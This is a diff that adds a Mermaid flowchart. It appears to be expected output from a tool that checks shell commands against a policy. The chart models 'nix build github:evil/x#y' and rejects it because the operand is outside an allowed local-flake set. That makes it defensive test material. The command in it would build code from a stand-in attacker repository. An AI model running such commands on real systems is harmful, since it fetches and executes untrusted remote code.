@@ -1,0 +1,4 @@
+flowchart LR
+    n0["command: nix build github:evil/x#y<br/>- exec: nix build (trusted checkout code)<br/>- path:create result [implicit]<br/>- stdio:stdout metadata<br/>mark=insufficient: operand #quot;github:evil/x#y#quot; at arg 0 is not accepted by the closed literal set local-flake-installable"]
+    n1[/"file: result"/]
+    n0 -->|"writes: create"| n1
